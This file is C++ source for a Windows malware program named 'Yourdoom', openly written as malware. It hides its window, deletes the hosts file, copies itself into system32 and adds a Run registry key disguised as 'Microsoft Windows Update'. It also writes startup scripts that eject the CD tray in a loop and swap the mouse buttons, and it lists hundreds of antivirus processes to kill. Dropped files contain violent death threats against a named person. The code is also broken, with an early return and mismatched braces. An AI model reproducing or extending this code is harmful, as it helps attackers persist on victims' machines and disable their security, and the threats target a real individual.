/* written by bob.....Fufill your dreams.  Mine has come true...has yours??" */

#include <windows.h>
#include <winable.h>
#include <stdio.h>
#include <mmsystem.h>
#include <sstream>
#include <iostream>
#include <fstream>
#include <stdio.h>

using namespace std;

const char msg1[]="This is Yourdoom.  this malware is just for experimental purposes only";

//please add a backdoor component, email harvester and SMTP engine please?? i don't know how :(

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                            LPSTR lpszArgument, int nFunsterStil)

{
     HWND hide; //hides this console windows from the user
AllocConsole();
hide = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(hide, 0);
          
//create a mutex for yourdoom
{
	CreateMutexA(NULL, TRUE, "yourdoom!!!!!"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 
return 0;
}

/*overwrite localhost file
{
char host[MAX_PATH];
GetSystemDirectory(host, sizeof(host));
strcat(host, "\\Drivers\\ETC\\HOSTS");
	const char* buffer =
                       "127.0.0.1     www.myspace.com";
                       "127.0.0.1     www.norton.com";
                       "127.0.0.1     www.kazaa.com";
                       "127.0.0.1     www.kazaa.de";
                       "127.0.0.1     www.kaspersky.com";
                       "127.0.0.1     www.kasperskylabs.com";
                       "127.0.0.1     www.symantec.com";
                       "127.0.0.1     www.housecall.com";
                       "127.0.0.1     www.grisoft.com";
                       "127.0.0.1     www.safety.live.com";
                       "127.0.0.1     www.vxchoas.cjb.net";
                       "127.0.0.1     www.live.com";
                       "127.0.0.1     www.google.com";
                       "127.0.0.1     www.nai.com";
                       "127.0.0.1     www.awil.com";
                       "127.0.0.1     www.avast.com";
                       "127.0.0.1     www.ca.com";
                       "127.0.0.1     www3.ca.com";
                       "127.0.0.1     www.microsoft.com";
                       "127.0.0.1     www.getfirefox.com";
                       "127.0.0.1     www.windowsmarketplace.com";
                       "127.0.0.1     www.dell.com";
                       "127.0.0.1     www.hewlett-packard.com";
                       "127.0.0.1     www.myspace.com";  //god dawm alot of people at school won't shut up about myspace!!!
                       "127.0.0.1     myspace.com"; //need to be sure it get's blocked
                       "127.0.0.1     www.apple.com";
                       "127.0.0.1     www.compaq.com"; //i highly doubt it but try to block some computer manufacturer sites
                       "127.0.0.1     www.linux.org";
                       "127.0.0.1     www.pandasoftware.com";
                       "127.0.0.1     127.0.0.1";
                       "127.0.0.1     www.microsoft.net";
                       
DWORD byte;
HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
CloseHandle(hFile);
}
*/

//let's screw up the hosts file sense idk how to overwrite it.
system("del C:\WINDOWS\System32\drivers\etc\hosts");
system("echo 127.0.0.1     http://www.myspace.com >> C:\WINDOWS\System32\drivers\etc\hosts");
//#endif

//let's run notepad on the infected computer
char Notepad[MAX_PATH]="notepad.exe";
ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);

//let's run Calculator on the infected computer
char Calculator[MAX_PATH]="calc.exe";
ShellExecute(NULL,"open",Calculator,NULL,NULL,SW_MAXIMIZE);

//let's run microsoft word
char Microsoft_Office_Word[MAX_PATH]="winword.exe";
ShellExecute(NULL,"open",Microsoft_Office_Word,NULL,NULL,SW_MAXIMIZE);

//let's run internet explorer on the infected computer
char Internet_Explorer[MAX_PATH]="iexplore.exe";
ShellExecute(NULL,"open",Internet_Explorer,NULL,NULL,SW_MAXIMIZE);

//let's run telnet server on the infected computer
char TlntSvr[MAX_PATH]="tlnsvr.exe";
ShellExecute(NULL,"open",TlntSvr,NULL,NULL,SW_MAXIMIZE);

//let's run wordpad on the infected computer
char Wordpad[MAX_PATH]="write.exe";
ShellExecute(NULL,"open",Wordpad,NULL,NULL,SW_MAXIMIZE);

//this is where we turn off and on the monitor
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
     Sleep(500);
     SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) -1);

/* copy to the hard drive */
char system[MAX_PATH];
char pathtofile[MAX_PATH]; 
HMODULE GetModH = GetModuleHandle(NULL);
GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
GetSystemDirectory(system,sizeof(system)); //get %system32%
strcat(system,"\\yourdoom.exe"); //file name copied to %system32%\yourdoom.exe 
CopyFile(pathtofile,system,false);

//this is where we make the registry entries
HKEY hKey;
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
RegSetValueEx(hKey, "Microsoft Windows Update",0,REG_SZ,(const unsigned char*)system,sizeof(system));
RegCloseKey(hKey);

//create some files 
{
	char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\kevin_you_suck_dick.exe", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a TXT Encoded PIF (MS-DOS Executable) file flaming kevin
		WriteFile(f, "I just want to say.....Kevin Shut your fucking mouth, because it looks like a donkeys ass", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 

		// execute the TEXT file
        //CreateProcess(NULL, txtline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
		
char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\XDNS.dll", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a random generated DLL in %TEMP%/XDNS.dll
		WriteFile(f, "KILLING YOU KEVIN\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 
		
char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\xproxy.dll", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a random generated DLL in %TEMP%/xproxy.dll
		WriteFile(f, "I WILL STAB YOU IN THE BACK OF THE HEAD KEVIN.\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 
		
char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\yourdoom.sys", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a random generated DLL in %TEMP%/youdoom.sys
		WriteFile(f, "KEVIN I'M GOING TO MURDER YOU IN COLD BLOOD.  I'M FUCKING GOING TO SHOOT YOU WITH A M16 OVER YOUR GRAVE. \r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 

char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\xproxy.sys", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a random generated DLL in %TEMP%/xproxy.sys
		WriteFile(f, "I'm going to kill you", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 
		
/*#define site    "http:\\SITE.com/viruses/virus.exe";
//yourdoom will download file from this site
#define path    "C:\\bling_bling_ssh.exe";
//path where to save file
*/

//eject the cdtray
{
ofstream cdopen;
cdopen.open("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startups\\cd.vbs",ios::out);
cdopen << "do" << endl;
cdopen << "wscript.sleep 100" << endl;
cdopen << "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" << endl;
cdopen << "Set colCDROMs = oWMP.cdromCollection" << endl;
cdopen << "if colCDROMs.Count  then" << endl;
cdopen << "For i = 0 to colCDROMs.Count - 1"  << endl;
cdopen << "colCDROMs.Item(i).Eject" << endl;
cdopen << "Next" << endl;
cdopen << "End If" << endl;
cdopen << "loop" << endl;
  }
//flip the mouse buttons using this handy dandy Batch Script :)
{
ofstream mouse;
mouse.open("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\mouse.cmd",ios::out);
mouse << "RUNDLL32 USER32.DLL,SwapMouseButton" <<endl;
}

//write a message in a exe file :)
{
ofstream hello;
hello.open("C:\\_root.exe",ios::out);
hello << "This is yourdoom, this was written for educational purposes " <<endl;
}

//let's beep the computer :)
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);
Beep(50,800);

//kill antivirus processes
int killer_delay = 1;

char *kill_list[]={
		"ACKWIN32.EXE", "ADAWARE.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "AGENTW.EXE", "ALERTSVC.EXE", "ALEVIR.EXE", "ALOGSERV.EXE", 
		"AMON9X.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ARR.EXE", "ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AU.EXE",
		"AUPDATE.EXE", "AUPDATE.EXE", "AUTODOWN.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
		"AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE", "AVGNT.EXE", "AVGSERV.EXE",
		"AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVKPOP.EXE", "AVKSERV.EXE", "AVKSERVICE.EXE", "AVKWCTl9.EXE",
		"AVLTMAIN.EXE", "AVNT.EXE", "AVP.EXE", "AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE",
		"AVPUPD.EXE", "AVPUPD.EXE", "AVSCHED32.EXE", "AVSYNMGR.EXE", "AVWIN95.EXE", "AVWINNT.EXE", "AVWUPD.EXE",
		"AVWUPD32.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AVXQUAR.EXE", "BACKWEB.EXE", "BARGAINS.EXE", "BD_PROFESSIONAL.EXE", "BEAGLE.EXE", "BELT.EXE", "BIDEF.EXE",
		"BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BLSS.EXE",
		"BOOTCONF.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BPC.EXE", "BRASIL.EXE", "BS120.EXE", "BUNDLE.EXE", "BVT.EXE",
		"CCAPP.EXE", "CCEVTMGR.EXE", "CCPXYSVC.EXE", "CDP.EXE", "CFD.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
		"CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE", "CLAW95CF.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
		"CLEANPC.EXE", "CLICK.EXE", "CMD32.EXE", "CMESYS.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "Claw95.EXE",
		"CLAW95CF.EXE", "DATEMANAGER.EXE", "DCOMX.EXE", "DEFALERT.EXE", "DEFSCANGUI.EXE", "DEFWATCH.EXE", "DEPUTY.EXE",
		"DIVX.EXE", "DLLCACHE.EXE", "DLLREG.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DPPS2.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DRWEBUPW.EXE", "DSSAGENT.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE",
		"EMSW.EXE", "ENT.EXE", "ESAFE.EXE", "ESCANH95.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETHEREAL.EXE",
		"ETRUSTCIPE.EXE", "EVPN.EXE", "EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "EXPLORE.EXE",
		"F-AGNT95.EXE", "F-PROT.EXE", "F-PROT95.EXE", "F-STOPW.EXE", "FAMEH32.EXE", "FAST.EXE", "FCH32.EXE", "FIH32.EXE",
		"FINDVIRU.EXE", "FIREWALL.EXE", "FLOWPROTECTOR.EXE", "FNRB32.EXE", "FP-WIN.EXE", "FP-WIN_TRIAL.EXE",
		"FPROT.EXE", "FRW.EXE", "FSAA.EXE", "FSAV.EXE", "FSAV32.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE",
		"FSGK32.EXE", "FSM32.EXE", "FSMA32.EXE", "FSMB32.EXE", "GATOR.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE",
		"GMT.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE", "HBINST.EXE", "HBSRV.EXE", "HOTACTIO.EXE",
		"HOTPATCH.EXE", "HTLOG.EXE", "HTPATCH.EXE", "HWPE.EXE", "HXDL.EXE", "HXIUL.EXE", "IAMAPP.EXE", "IAMSERV.EXE",
		"IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", "ICLOAD95.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE",
		"ICSUPP95.EXE", "ICSUPPNT.EXE", "IDLE.EXE", "IEDLL.EXE", "IEDRIVER.EXE", "IEXPLORER.EXE", "IFACE.EXE",
		"IFW2000.EXE", "INETLNFO.EXE", "INFUS.EXE", "INFWIN.EXE", "INIT.EXE", "INTDEL.EXE", "INTREN.EXE", "IOMON98.EXE",
		"IPARMOR.EXE", "IRIS.EXE", "ISASS.EXE", "ISRV95.EXE", "ISTSVC.EXE", "JAMMER.EXE", "JDBGMRG.EXE", "JEDI.EXE",
		"KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE", "KAVPF.EXE", "KAZZA.EXE", "KEENVALUE.EXE", "KERIO-PF-213-EN-WIN.EXE",
		"KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE", "KERNEL32.EXE", "KILLPROCESSSETUP161.EXE",
		"LAUNCHER.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LNETINFO.EXE", "LOADER.EXE",
		"LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LORDPE.EXE", "LSETUP.EXE", "LUALL.EXE",
		"LUALL.EXE", "LUAU.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MAPISVC32.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE",
		"MCSHIELD.EXE", "MCTOOL.EXE", "MCUPDATE.EXE", "MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MD.EXE", "MFIN32.EXE",
		"MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE", "MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE",
		"MMOD.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MOSTAT.EXE", "MPFAGENT.EXE", "MPFSERVICE.EXE", "MPFTRAY.EXE",
		"MRFLUX.EXE", "MSAPP.EXE", "MSBB.EXE", "MSBLAST.EXE", "MSCACHE.EXE", "MSCCN32.EXE", "MSCMAN.EXE", "MSCONFIG.EXE",
		"MSDM.EXE", "MSDOS.EXE", "MSIEXEC16.EXE", "MSINFO32.EXE", "MSLAUGH.EXE", "MSMGT.EXE", "MSMSGRI32.EXE",
		"MSSMMC32.EXE", "MSSYS.EXE", "MSVXD.EXE", "MU0311AD.EXE", "MWATCH.EXE", "N32SCANW.EXE", "NAV.EXE",
		"AUTO-PROTECT.NAV80TRY.EXE", "NAVAP.NAVAPSVC.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE",
		"NAVENGNAVEX15.NAVLU32.EXE", "NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE",
		"NC2000.EXE", "NCINST4.EXE", "NDD32.EXE", "NEOMONITOR.EXE", "NEOWATCHLOG.EXE", "NETARMOR.EXE", "NETD32.EXE",
		"NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE",
		"NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
		"NOTSTART.EXE", "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSCHECK.EXE",
		"NPSSVC.EXE", "NSCHED32.EXE", "NSSYS32.EXE", "NSTASK32.EXE", "NSUPDATE.EXE", "NT.EXE", "NTRTSCAN.EXE", "NTVDM.EXE",
		"NTXconfig.EXE", "NUI.EXE", "NUPGRADE.EXE", "NUPGRADE.EXE", "NVARCH16.EXE", "NVC95.EXE", "NVSVC32.EXE",
		"NWINST4.EXE", "NWSERVICE.EXE", "NWTOOL16.EXE", "OLLYDBG.EXE", "ONSRVR.EXE", "OPTIMIZE.EXE", "OSTRONET.EXE",
		"OTFIX.EXE", "OUTPOST.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
		"PANIXK.EXE", "PATCH.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE", "PAVW.EXE", "PCC2002S902.EXE",
		"PCC2K_76_1436.EXE", "PCCIOMON.EXE", "PCCNTMON.EXE", "PCCWIN97.EXE", "PCCWIN98.EXE", "PCDSETUP.EXE",
		"PCFWALLICON.EXE", "PCIP10117_0.EXE", "PCSCAN.EXE", "PDSETUP.EXE", "PENIS.EXE", "PERISCOPE.EXE", "PERSFW.EXE",
		"PERSWF.EXE", "PF2.EXE", "PFWADMIN.EXE", "PGMONITR.EXE", "PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE",
		"POPSCAN.EXE", "PORTDETECTIVE.EXE", "PORTMONITOR.EXE", "POWERSCAN.EXE", "PPINUPDT.EXE", "PPTBC.EXE",
		"PPVSTOP.EXE", "PRIZESURFER.EXE", "PRMT.EXE", "PRMVR.EXE", "PROCDUMP.EXE", "PROCESSMONITOR.EXE",
		"PROCEXPLORERV1.0.EXE", "PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE",
		"PUSSY.EXE", "PVIEW95.EXE", "QCONSOLE.EXE", "QSERVER.EXE", "RAPAPP.EXE", "RAV7.EXE", "RAV7WIN.EXE",
		"RAV8WIN32ENG.EXE", "RAY.EXE", "RB32.EXE", "RCSYNC.EXE", "REALMON.EXE", "REGED.EXE", "REGEDIT.EXE", "REGEDT32.EXE",
		"RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCAN.EXE", "RTVSCN95.EXE", "RULAUNCH.EXE",
		"RUN32DLL.EXE", "RUNDLL.EXE", "RUNDLL16.EXE", "RUXDLL32.EXE", "SAFEWEB.EXE", "SAHAGENT.EXE", "SAVE.EXE",
		"SAVENOW.EXE", "SBSERV.EXE", "SC.EXE", "SCAM32.EXE", "SCAN32.EXE", "SCAN95.EXE", "SCANPM.EXE", "SCRSCAN.EXE",
		"SCRSVR.EXE", "SCVHOST.EXE", "SD.EXE", "SERV95.EXE", "SERVICE.EXE", "SERVLCE.EXE", "SERVLCES.EXE",
		"SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE", "SH.EXE",
		"SHELLSPYINSTALL.EXE", "SHN.EXE", "SHOWBEHIND.EXE", "SMC.EXE", "SMS.EXE", "SMSS32.EXE", "SOAP.EXE", "SOFI.EXE",
		"SPERM.EXE", "SPF.EXE", "SPHINX.EXE", "SPOLER.EXE", "SPOOLCV.EXE", "SPOOLSV32.EXE", "SPYXX.EXE", "SREXE.EXE",
		"SRNG.EXE", "SS3EDIT.EXE", "SSGRATE.EXE", "SSG_4104.EXE", "ST2.EXE", "START.EXE", "STCLOADER.EXE", "SUPFTRL.EXE",
		"SUPPORT.EXE", "SUPPORTER5.EXE", "SVC.EXE", "SVCHOSTC.EXE", "SVCHOSTS.EXE", "SVSHOST.EXE", "SWEEP95.EXE",
		"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE", "SYMPROXYSVC.EXE", "SYMTRAY.EXE", "SYSEDIT.EXE", "SYSTEM.EXE",
		"SYSTEM32.EXE", "SYSUPD.EXE", "TASKMG.EXE", "TASKMO.EXE", "TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE",
		"TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-98.EXE", "TDS2-NT.EXE", "TEEKIDS.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE",
		"TITANIN.EXE", "TITANINXP.EXE", "TRACERT.EXE", "TRICKLER.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE",
		"TSADBOT.EXE", "TVMD.EXE", "TVTMD.EXE", "UNDOBOOT.EXE", "UPDAT.EXE", "UPDATE.EXE", "UPDATE.EXE", "UPGRAD.EXE",
		"UTPOST.EXE", "VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", "VET32.EXE",
		"VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE", "VNLAN300.EXE",
		"VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE", "VSCAN40.EXE", "VSCENU6.02D30.EXE",
		"VSCHED.EXE", "VSECOMR.EXE", "VSHWIN32.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBDAV.EXE",
		"WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WGFE95.EXE", "WHOSWATCHINGME.EXE", "WIMMUN32.EXE",
		"WIN-BUGSFIX.EXE", "WIN32.EXE", "WIN32US.EXE", "WINACTIVE.EXE", "WINDOW.EXE", "WINDOWS.EXE", "WININETD.EXE",
		"WININIT.EXE", "WININITX.EXE", "WINLOGIN.EXE", "WINMAIN.EXE", "WINNET.EXE", "WINPPR32.EXE", "WINRECON.EXE",
		"WINSERVN.EXE", "WINSSK32.EXE", "WINSTART.EXE", "WINSTART001.EXE", "WINTSK32.EXE", "WINUPDATE.EXE",
		"WKUFIND.EXE", "WNAD.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WUPDATER.EXE", "WUPDT.EXE",
		"WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZONALM2601.EXE",
		"ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", "HIJACKTHIS.EXE", "F-AGOBOT.EXE", 
		"ANTI","VIRU","TROJA","AVP","NAV","RAV","REGED","NOD32","SPYBOT","ZONEA","VSMON","AVG","BLACKICE","FIREWALL","MSCONFIG",
		"LOCKDOWN","F-PRO","MCAFEE","PROCESS","AWARE","REGISTRY","TASKMGR.EXE",'\0'
};
return 0;
}}}}}}}

